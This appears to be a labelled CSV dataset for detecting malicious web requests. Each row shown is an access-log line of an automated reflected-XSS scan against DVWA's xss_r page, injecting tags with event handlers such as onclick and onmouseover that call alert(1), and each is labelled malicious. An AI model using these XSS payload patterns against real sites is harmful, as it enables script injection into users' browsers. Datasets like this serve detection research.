url,malicious
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<cite onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<cite onmousedown=\""alert(1)\"">test</cite>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<cite onmouseenter=\""alert(1)\"">test</cite>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<cite onmouseleave=\""alert(1)\"">test</cite>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<cite onmousemove=\""alert(1)\"">test</cite>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<cite onmouseout=\""alert(1)\"">test</cite>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<cite onmouseover=\""alert(1)\"">test</cite>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<cite onmouseup=\""alert(1)\"">test</cite>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<cite onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onclick=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code oncontextmenu=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code ondblclick=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onmousedown=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onmouseenter=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onmouseleave=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onmousemove=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onmouseout=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onmouseover=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:30 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onmouseup=\""alert(1)\"">test</code>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<code onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:31 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onclick=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col oncontextmenu=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col ondblclick=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onmousedown=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onmouseenter=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onmouseleave=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onmousemove=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onmouseout=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onmouseover=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onmouseup=\""alert(1)\"">test</col>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<col onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onclick=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup oncontextmenu=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup ondblclick=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onmousedown=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onmouseenter=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onmouseleave=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onmousemove=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onmouseout=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onmouseover=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onmouseup=\""alert(1)\"">test</colgroup>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<colgroup onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onclick=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command oncontextmenu=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command oncut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command ondblclick=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onfocusout=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onkeydown=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onkeypress=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onkeyup=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onmousedown=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onmouseenter=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onmouseleave=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onmousemove=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onmouseout=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onmouseover=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onmouseup=\""alert(1)\"">test</command>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<command onpaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content draggable=\""true\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content id=x"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content onbeforecopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content onbeforecut=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content onbeforepaste=\""alert(1)\"""" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content onblur=alert(1)"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content onclick=\""alert(1)\"">test</content>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content oncontextmenu=\""alert(1)\"">test</content>"" 400 0 ""-"" ""-""",1
"127.0.0.1 - - [03/May/2021:03:40:32 -0400] ""GET /DVWA/vulnerabilities/xss_r/?name=<content oncopy=\""alert(1)\"""" 400 0 ""-"" ""-""",1
